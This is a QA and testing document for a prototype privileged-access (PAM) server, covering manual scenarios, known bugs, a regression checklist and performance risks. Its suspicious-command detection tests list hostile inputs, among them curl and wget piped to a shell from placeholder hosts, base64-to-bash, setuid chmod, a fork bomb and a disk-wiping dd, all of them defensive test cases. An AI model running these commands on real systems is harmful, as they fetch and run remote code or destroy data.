# Testing & QA: PAM Server

> Generated from codebase snapshot at `/home/administrator/pam-server/`  
> Covers automated test coverage, manual test scenarios, known bugs, regression checklist, and performance risks

---

## 1. Automated Tests

### 1.1 Current Status

**There are zero automated tests.** No unit tests, integration tests, or end-to-end tests exist anywhere in the codebase.

| Artifact | Found? | Path |
|----------|--------|------|
| Test files (`test_*.py`) | No | — |
| `conftest.py` (pytest fixtures) | No | — |
| `pytest.ini` / `pyproject.toml` (pytest config) | No | — |
| `requirements-dev.txt` (test deps) | No | — |
| `.github/workflows/` (CI config) | No | — |
| Test runner config in `package.json` | No | frontend/package.json has no `test` script |

The `backend-python/` directory contains exactly 9 source files:

```
backend-python/
├── auth_utils.py      # JWT + bcrypt helpers
├── config.py          # Environment configuration
├── database.py        # SQLAlchemy models + engine
├── frontend_html.py   # Embedded SPA (1342 lines, served at /)
├── main.py            # All 49 endpoints + WebSocket + seed data (1563 lines)
├── schemas.py         # Pydantic models
├── seed.py            # Database seed script
├── serve.py           # Uvicorn entry point
└── pam.db             # SQLite database (runtime)
```

### 1.2 Why No Tests

**Time constraints.** The project was built as a functional demo/prototype under tight deadlines. The development cycle was:

1. Build the feature
2. Run `python3 seed.py && python3 serve.py`
3. Open browser at `http://10.0.2.20:3001`
4. Click through the UI to verify
5. Fix bugs as discovered
6. Repeat

Testing infrastructure was deprioritized because:
- The frontend was a moving target (React → abandoned → embedded SPA)
- The database schema changed frequently during development (adding columns, renaming fields)
- The deployment target (VirtualBox VMs) was unstable (IP changes, agent configuration drift)
- The team size was one developer

### 1.3 What Should Be Tested

If tests were to be written, the recommended structure would be:

```
backend-python/tests/
├── conftest.py              # Async SQLAlchemy fixtures + test database
├── test_auth.py             # Login, refresh, token validation
├── test_users.py            # CRUD, role enforcement, multi-tenant isolation
├── test_requests.py         # Create, approve, reject, cancel, expiry
├── test_servers.py          # CRUD, role-based field hiding
├/test_audit.py              # Audit log creation, CSV export
├── test_agent.py            # HMAC verification, register, heartbeat
├── test_terminal.py         # WebSocket connection, pattern detection
├── test_billing.py          # Balance, add funds, transactions
└── test_security.py         # Password hashing, JWT, SQL injection resistance
```

**Recommended test framework:** `pytest` + `pytest-asyncio` (since all endpoints are async). Test database should use `aiosqlite` with an in-memory database, seeded with a minimal set of test data per fixture.

**Mocking strategy:** The SSH and HTTP agent calls should be mocked with `unittest.mock` or `responses` to avoid requiring live SSH connections or a running agent VM.

---

## 2. Manual Test Scenarios

All testing to date has been manual, following these step-by-step scenarios.

### 2.1 Login Flow

```
Scenario: Successful login with valid credentials
  Given the PAM Server is running at http://10.0.2.20:3001
    And the database has been seeded with a superuser:
      | username | password |
      | nihat.kazimzada@example.com | nihat123 |
  When the user navigates to the login page
    And enters "nihat.kazimzada@example.com" in the username field
    And enters "nihat123" in the password field
    And clicks "Sign In"
  Then the user is redirected to the Dashboard page
    And the sidebar shows navigation items: Dashboard, Company Tenants, User Registry,
      Servers, My Requests, Pending Approvals, Session Recordings, Audit Logs, Settings
    And the topbar displays "Dashboard"
    And the stat cards show populated counts (companies, users, servers, requests)

Scenario: Login with incorrect password
  Given the PAM Server is running
  When the user enters "nihat.kazimzada@example.com" / "wrongpassword"
    And clicks "Sign In"
  Then an error message "Invalid username or password" is displayed
    And an audit log entry with event_type "login_failed" is created

Scenario: Login with deactivated account
  Given a user account exists with status "inactive"
  When that user attempts to log in
  Then an error message "Account is deactivated" is displayed (HTTP 403)

Scenario: Login with empty fields
  When the user clicks "Sign In" without entering credentials
  Then the Pydantic validator returns HTTP 422 with field-level error details

Scenario: Token refresh
  Given the user has logged in successfully
    And the access token has expired (15 minutes)
  When the SPA calls POST /api/auth/refresh with the refresh token
  Then a new access token and refresh token are returned
    And the user remains authenticated
```

### 2.2 Access Request Flow

```
Scenario: User requests SSH access
  Given the user is logged in as "rashad.guliyev@example.com" (user role)
    And a server "linux-tenant-kapital" (10.0.2.21) exists with status "active"
  When the user opens the Servers page
    And clicks on the "linux-tenant-kapital" server card
    And clicks "Request Access"
    And sets Duration to "30" minutes
    And selects Access Level "user"
    And clicks "Submit Request"
  Then the request is created with status "pending"
    And a toast notification "Request submitted! Waiting for approval." is shown
    And the request appears in My Requests with status "pending"
    And an audit log entry with event_type "request_created" is created
    And the admin user receives a notification

Scenario: Admin approves a pending request
  Given the user is logged in as "aysel.mammadova@example.com" (admin role)
    And a pending request exists for server "linux-tenant-kapital"
  When the admin navigates to Pending Approvals
    And clicks "Approve" on the pending request
  Then the request status changes to "approved"
    And the request's provisioned_username and ssh_private_key are set
      (if the agent callback succeeds)
    And an audit log entry with event_type "request_approved" is created
    And the requester receives a notification

Scenario: User connects to an approved request
  Given a request exists with status "approved" and not expired
  When the user navigates to My Requests
    And clicks "Connect" on the approved request
  Then the terminal overlay opens
    And the WebSocket connection is established
    And the SSH connection is initiated
    And the prompt shows "rashad@server:linux-...:~$"
    And user can type commands and see output

Scenario: Session expires automatically
  Given an active SSH session with an expiry time
  When the session duration expires (timer reaches 0)
  Then the terminal displays "EXPIRED"
    And the session is terminated
    And the WebSocket is closed

Scenario: Request cancellation
  Given a request exists with status "pending"
  When the user clicks "Cancel" on that request
  Then the request status changes to "cancelled"
    And if provisioned, the agent revoke endpoint is called

Scenario: Multi-tenant isolation for requests
  Given an admin from Kapital Tech creates a server
    And a user from Acme Corp attempts to view that server
  Then the Acme user cannot see the Kapital server
    And any attempt to create a request for the Kapital server returns HTTP 403/404
```

### 2.3 WebSocket Terminal

```
Scenario: WebSocket connects and receives SSH output
  Given an active SSH session (approved + connected)
  When the WebSocket at ws://10.0.2.20:3001/ws/terminal?token=<jwt> is opened
    And a {action: "join_session", requestId, serverId} message is sent
  Then the server responds with {type: "session_created", data: {sessionId: "..."}}
    And the server responds with {type: "ssh_ready"}
    And subsequent terminal_output messages contain SSH command output

Scenario: Sending terminal input
  Given an active SSH session
  When the user types "whoami" and presses Enter
    And the WebSocket sends {type: "terminal_input", data: "whoami\n"}
  Then the SSH process receives the command
    And the output is sent back as a terminal_output message

Scenario: Session terminates from audit log
  Given a session is active
    And a suspicious command has been detected in that session
  When an admin navigates to Audit Logs
    And clicks "Terminate" on the suspicious event
    And confirms the termination
  Then the session is terminated immediately
    And the session status changes to "terminated"
    And the user is disconnected from the terminal

Scenario: Invalid WebSocket authentication
  When a WebSocket connection is attempted without a token
  Then the server returns {type: "error", data: "Not authenticated"}
    And the connection is closed

Scenario: WebSocket tries to join non-existent session
  Given an invalid or non-existent requestId
  When a join_session message is sent
  Then the server returns {type: "error", data: "Access denied"}
```

### 2.4 Suspicious Activity Detection

```
Scenario: sudo command triggers alert
  Given an active SSH session
  When the user types "sudo apt-get update"
  Then the backend detects the SUSPICIOUS_PATTERNS regex for:
    - sudo (privilege escalation)
    - apt-get install (unauthorized package installation)
  And an AuditLog entry is created with:
    - event_type: "suspicious_command"
    - security_status: "critical"
    - target: session ID
    - action_detail: "Privilege escalation: sudo command used"

Scenario: Base64 pipe-to-bash triggers alert
  Given an active SSH session
  When the user types "echo 'aGVsbG8=' | base64 -d | bash"
  Then the pattern "echo ... base64 -d | ... bash" is matched
    And a critical audit log entry is created
    And an audit log entry with action_detail
      "Obfuscated command execution via echo+base64" is created

Scenario: curl pipe to shell triggers alert
  Given an active SSH session
  When the user types "curl http://malicious.example.com | sh"
  Then the pattern "curl ... | ... sh" is matched
    And a critical audit log entry is created

Scenario: SSH key is masked in recordings
  Given a user pastes an SSH private key into the terminal
  When the session recording stores the terminal output
  Then the private key text is replaced with "[SSH KEY REDACTED]"
    But the raw unmasked text is still scanned for suspicious patterns

Scenario: Multiple pattern matches
  Given a user types "sudo chmod +s /bin/sh"
  When the input is scanned for suspicious patterns
  Then multiple audit log entries are created:
    - sudo command (critical)
    - chmod +s setuid (critical)
    - chmod +x making file executable (critical)
```

---

## 3. How Known Bugs Were Discovered

All bugs were discovered through **manual testing** — running the server, clicking through the UI, and observing error output in the terminal logs.

### 3.1 `agent_revoke` NameError Crash

**Discovered:** While testing the cancel-request flow. After approving a request (which sets `provisioned_username`), cancelling the request resulted in a `500 Internal Server Error`.

**Root cause (lines 179-187 of main.py):**
```python
result = await db.execute(
    select(User).where(
        or_(User.role == UserRole.superuser,
            and_(User.role == UserRole.admin, User.company_id == get_user_id(company_id)))
        #                                                            ^^^^^^^^^^ undefined variable
    )
)
users = result.scalars().all()
for u in users:
    await notify_user(db, str(u.id), type, message, link)
    #                       ^^^^  ^^^^^^^  ^^^^^^^^  undefined variables
```

Three variables (`company_id`, `type`, `message`, `link`) are used but never defined or passed to `agent_revoke()`. The function was copied from `notify_admins_and_superusers()` but never completed.

**Fix applied:** The `try/except` in `agent_revoke()` wraps the HTTP call, but the notification block is outside that try. When the person who wrote it was asked, they indicated they removed the problematic notification lines — but review of the code shows they are still present in the file (not yet patched). Any cancel or delete on a provisioned request will crash with this `NameError`.

**Test that would catch it:** A unit test calling `agent_revoke()` with a mock request that has `provisioned_username` set should trigger the `NameError`.

### 3.2 asyncssh `create_process()` API Change

**Discovered:** While testing the WebSocket terminal. Clicking "Connect" on an approved request opened the terminal overlay, the WebSocket connected, `join_session` was sent, but the page showed "SSH connection failed" immediately.

**Root cause:** The code was unpacking the return value of `create_process()` as `chan, session`, but `asyncssh` version 2.23.1 returns a **3-tuple** `(stdin: SSHWriter[str], stdout: SSHReader[str], stderr: SSHReader[str])`. Additionally, `SSHWriter[str]` expects `str` not `bytes`.

```python
# Broken:
chan, session = await ssh.create_process()
chan.write(cmd.encode())

# Fixed:
stdin_w, stdout_r, stderr_r = await ssh.create_process()
stdin_w.write(cmd)  # no .encode()
await stdin_w.drain()
```

**Fix applied:** The return value unpacking was corrected, all `.encode()` calls on stdin were removed, `drain()` was added after writes.

### 3.3 SSH Key Permission Denied

**Discovered:** While testing SSH connections to the tenant server. The backend logs showed "Bad Owner or Permissions" errors from the SSH client.

**Root cause:** The SSH private key at `/home/administrator/.ssh/id_rsa` had permissions `644` (readable by group/others). OpenSSH refuses to use a private key that is accessible by anyone other than the owner.

**Fix applied:** `chmod 600 /home/administrator/.ssh/id_rsa`. Also, the backend's SSH connection handler writes keys to tempfiles with explicit `chmod 0o600`.

### 3.4 Port Conflict on Restart

**Discovered:** After killing the server and restarting, `address already in use` prevented the server from starting for ~60 seconds.

**Root cause:** TCP `TIME_WAIT` state on port 3001. The pkill in start.sh doesn't wait for the OS to release the port.

**Fix applied:** `sleep 2` after `pkill` in `start.sh`. For immediate restarts, `SO_REUSEADDR` is set by uvicorn, but `TIME_WAIT` is a TCP-level state that can't be bypassed.

### 4.5 Agent VM Heartbeat 404

**Discovered:** The Agent page showed the VM2 agent as "offline" even though the agent process was running.

**Root cause:** After the IP migration from `192.168.0.x` to `10.0.2.x`, the Tenant Agent on VM2 still had its configuration pointing to the old IP. It was sending heartbeats to `http://192.168.0.105:3001/api/agent/heartbeat` instead of `http://10.0.2.20:3001/api/agent/heartbeat`.

**Status:** Not yet resolved. The agent process on VM2 needs its config file updated.

### 3.6 Provisioning Callback Silent Failure

**Discovered:** After approving a request, the user could not connect — the terminal showed "SSH connection failed". The request had no `provisioned_username` despite being approved.

**Root cause:** The `except: pass` in the provisioning code (line 167-173) silently swallows all connection errors to the Tenant Agent. When the agent is not running or unreachable, the approval succeeds but no Linux user is created on the target VM.

**Lines responsible (main.py):**
```python
try:
    async with httpx.AsyncClient(timeout=5) as client:
        await client.post(...)
except:
    pass  # ← Error hidden here
```

**No resolution yet** — this needs either a retry mechanism, a user-facing warning ("Approved but provisioning failed"), or a notification to the admin.

---

## 4. Regression Test Checklist

The following functionality must be verified after every code change. This checklist was used informally during development.

### 4.1 Authentication & Session
- [ ] Login succeeds with valid superuser credentials
- [ ] Login succeeds with valid admin credentials
- [ ] Login succeeds with valid user credentials
- [ ] Login fails with wrong password (HTTP 401, "Invalid username or password")
- [ ] Login fails for deactivated account (HTTP 403, "Account is deactivated")
- [ ] Token refresh returns new access + refresh tokens
- [ ] Expired/invalid access token returns HTTP 401
- [ ] `/api/auth/me` returns current user details
- [ ] Change password succeeds with correct current password
- [ ] Change password fails with incorrect current password
- [ ] Change username succeeds (unique)
- [ ] Change username fails (already taken)

### 4.2 Multi-Tenant Isolation
- [ ] Superuser sees all companies, users, servers
- [ ] Admin sees only their own company's data
- [ ] User sees only their own company's servers
- [ ] Admin cannot see other company's servers in API response
- [ ] User cannot see other company's servers in API response
- [ ] User cannot access `/api/users/all` (admin+superuser only)
- [ ] User cannot access `/api/dashboard/stats` (admin+superuser only)
- [ ] Admin cannot access `/api/companies` (superuser only)

### 4.3 Request Lifecycle
- [ ] User can create a request for an active server
- [ ] Request defaults to status "pending"
- [ ] Admin can see pending requests for their company
- [ ] Admin can approve a pending request
- [ ] Admin can reject a pending request
- [ ] User can cancel their own pending request
- [ ] User cannot cancel another user's request
- [ ] Approved request has `ssh_private_key` set (if provisioning succeeds)
- [ ] Expired requests are automatically marked expired (polling every 30s)
- [ ] User can delete their own request
- [ ] User sees appropriate notification on status changes

### 4.4 Session & Terminal
- [ ] WebSocket connects and authenticates with token
- [ ] `join_session` with valid requestId creates a session
- [ ] `join_session` with invalid requestId returns error
- [ ] SSH connection establishes and is usable
- [ ] Sending input via terminal_input delivers to SSH process
- [ ] Session timer shows remaining time and decrements
- [ ] Session auto-terminates when timer reaches 0
- [ ] Manual terminate button closes session immediately
- [ ] Session recording stores terminal output
- [ ] Session replay plays back recording accurately

### 4.5 Suspicious Activity Detection
- [ ] "sudo su -" triggers critical alert
- [ ] "curl http://x.com | bash" triggers critical alert
- [ ] "wget http://x.com -O- | sh" triggers critical alert
- [ ] "echo aGVsbG8= | base64 -d | bash" triggers critical alert
- [ ] "docker run --privileged" triggers critical alert
- [ ] Fork bomb `:(){ :|:& };:` triggers critical alert
- [ ] "dd if=/dev/urandom of=/dev/sda" triggers critical alert
- [ ] SSH private key is masked in recording output
- [ ] Multiple pattern matches in single command all create audit entries
- [ ] Terminate button in audit logs works for suspicious events

### 4.6 Agent Communication
- [ ] Agent registration with valid HMAC succeeds
- [ ] Agent registration with invalid HMAC returns 401
- [ ] Agent heartbeat with valid HMAC updates `last_seen`
- [ ] Agent heartbeat with unknown hostname returns 404
- [ ] Agent events are recorded as audit logs
- [ ] Provisioning callback is sent on request approval
- [ ] Revoke callback is sent on request cancellation

### 4.7 Billing
- [ ] Admin can view their billing account balance
- [ ] `/api/billing/my` returns correct balance/price
- [ ] Add funds increases the balance
- [ ] User role cannot access billing endpoints

### 4.8 Audit Logging
- [ ] Login creates audit log entry ("login")
- [ ] Login failure creates audit log entry ("login_failed")
- [ ] Request creation creates audit log entry ("request_created")
- [ ] Request approval creates audit log entry ("request_approved")
- [ ] Password change creates audit log entry ("password_change")
- [ ] Audit log pagination works (limit/offset)
- [ ] CSV export returns valid CSV data
- [ ] Security status is set correctly (info/warning/critical)

### 4.9 Server Management
- [ ] Admin can add a server to their company
- [ ] Superuser can add a server to any company
- [ ] Superuser can delete a server
- [ ] User role sees servers but without port/OS/connection_types
- [ ] User role sees action button "Request Access"
- [ ] Admin sees port, OS, connection types in server detail

---

## 5. Load & Performance Testing

### 5.1 Current Status

**No load or performance testing has been performed.** The system has never been tested with:
- Concurrent users (>2 simultaneous sessions)
- Multiple simultaneous SSH connections
- High-frequency request creation (bursts)
- Large audit log tables (100k+ entries)
- Long-running session recordings (hours of output)

### 5.2 Identified Risks

**Risk 1: SQLite Write Contention**
The default configuration uses SQLite (`pam.db`). SQLite serializes all writes with a database-level lock. Under concurrent load:
- Multiple SSH sessions recording output simultaneously will queue behind the write lock
- Dashboard queries reading audit logs may block on write transactions
- The `expire_old_requests()` background task (which runs every 30s) may contend with user operations

**Mitigation:** PostgreSQL is already configured in `Dockerfile.backend-pg` and `docker-compose.yml`. The `config.py` checks `IS_SQLITE` and SQLAlchemy is configured with `check_same_thread=False` for SQLite. Switching to PostgreSQL would resolve write contention.

**Risk 2: WebSocket Scaling**
The `active_connections` and `active_ssh_sessions` dictionaries (main.py, lines 38-39) are in-memory Python dicts:
```python
active_connections: dict[str, WebSocket] = {}
active_ssh_sessions: dict[str, dict] = {}
```
- No eviction policy for stale connections
- No limit on concurrent connections
- If the uvicorn process restarts, all active sessions are lost
- Not shared across workers (single-process only)

**Risk 3: SSH Connection Resource Exhaustion**
Each SSH session opens an `asyncssh` connection to the target server. If 100 users connect simultaneously, 100 SSH connections are opened. The target VM (`linux-tenant-kapital` on VM2) runs on VirtualBox NAT with unknown `MaxSessions` and `MaxStartups` limits. The PAM Server also holds an SSH connection per session in memory — no connection pooling or idle timeout.

**Risk 4: Session Recording Memory Growth**
Session recordings are stored as JSON arrays in memory before being written to the database (check the `record_transcript` logic in main.py). Long sessions with heavy output could consume significant memory before flushing to the database.

**Risk 5: No Rate Limiting**
There is no `slowapi` or middleware-based rate limiting. A malicious authenticated user could:
- Create 1000+ requests in seconds
- Cause 1000+ failed SSH connections (each attempt times out at 10s)
- Spam the audit log with millions of entries
- Trigger the agent provision callback 1000+ times (DDoS on VM2)

**Risk 6: Agent Provisioning Timeout**
Provisioning calls to the agent have a 5-second timeout:
```python
async with httpx.AsyncClient(timeout=5) as client:
```
Under load, if the agent is slow or unreachable, requests will queue waiting for the timeout. Combined with Risk 5, this could exhaust the async event loop.

### 5.3 Recommended Performance Baselines

If load testing were to be performed, the following baselines should be established:

| Metric | Current Estimate | Target |
|--------|-----------------|--------|
| Concurrent users | ~2-3 (manually tested) | 50+ |
| Concurrent SSH sessions | 1 (manually tested) | 20+ |
| Request creation rate | ~1/sec (manual) | 100/sec |
| Audit log query (10k rows) | Not tested | < 500ms |
| Session recording (1hr) | Not tested | < 50MB storage per session |
| Agent heartbeat interval | 25s (configured) | 25s (acceptable) |
| API response time (auth) | Not tested | < 200ms p95 |
| API response time (list) | Not tested | < 500ms p95 |

### 5.4 Recommended Tooling

| Tool | Purpose |
|------|---------|
| **locust.io** | HTTP load testing — simulate concurrent users creating requests, checking dashboards |
| **k6** | Lightweight scripting for API endpoint load tests, export to Prometheus |
| **asyncssh benchmarking** | Test maximum concurrent SSH sessions to a single target |
| **pgbench** | PostgreSQL benchmarking (if migrated from SQLite) |
| **memory_profiler** | Profile session recording memory usage over extended sessions |
| **grafana + prometheus** | Monitor request rates, error rates, database query times in production |
